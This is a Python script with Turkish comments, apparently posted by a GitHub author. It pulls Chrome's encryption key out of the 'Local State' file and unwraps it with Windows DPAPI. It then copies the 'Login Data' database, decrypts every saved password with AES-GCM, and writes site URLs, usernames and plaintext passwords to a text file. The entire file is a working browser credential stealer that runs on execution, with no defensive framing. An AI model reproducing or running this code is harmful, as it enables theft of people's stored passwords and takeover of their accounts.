import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import shutil
import win32crypt

# AES anahtarını çözmek için gerekli fonksiyon
def get_chrome_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    
    # Şifrelenmiş AES anahtarı
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    
    # "DPAPI" prefiksi çıkarılıyor
    encrypted_key = encrypted_key[5:]
    
    # AES anahtarı çözülüyor
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Şifreyi çözmek için AES kullanarak şifreyi çözme fonksiyonu
def decrypt_password(encrypted_password, key):
    try:
        # Şifreli şifreyi ayıklamak
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        
        # AES-GCM modunda şifreyi çözmek
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()  # Son 16 bayt kimlik doğrulama için
        return decrypted_password
    except Exception as e:
        print(f"Şifre çözülemedi: {e}")
        return ""

# Chrome şifrelerini almak için ana fonksiyon
def get_chrome_passwords():
    # Chrome şifrelerinin saklandığı dosyanın yolu
    db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
    if not os.path.exists(db_path):
        print("Login Data dosyası bulunamadı!")
        return

    # Şifre veritabanını kopyala çünkü açık veritabanında işlem yapmak sorun çıkarabilir
    temp_db_path = "LoginData_temp.db"
    shutil.copyfile(db_path, temp_db_path)

    # AES anahtarını al
    key = get_chrome_key()

    # Sonuçların kaydedileceği dosya
    output_file = "chrome_passwords.txt"

    # Şifrelerin depolandığı SQLite veritabanını aç
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()

    # Şifrelerin bulunduğu tablodan verileri çek
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    # Dosyayı aç ve yazmaya başla
    with open(output_file, 'w', encoding='utf-8') as f:
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]

            # Şifreyi çöz
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
            else:
                decrypted_password = "Boş şifre"

            # Dosyaya yaz
            f.write(f"URL: {url}\n")
            f.write(f"Kullanıcı Adı: {username}\n")
            f.write(f"Şifre: {decrypted_password}\n\n")

    # Veritabanı bağlantısını kapat ve geçici dosyayı sil
    conn.close()
    os.remove(temp_db_path)

    print(f"Şifreler '{output_file}' dosyasına kaydedildi.")

# Chrome şifrelerini al
get_chrome_passwords()


# Created by TPàshà
# https://www.github.com/TPashaxrd TR
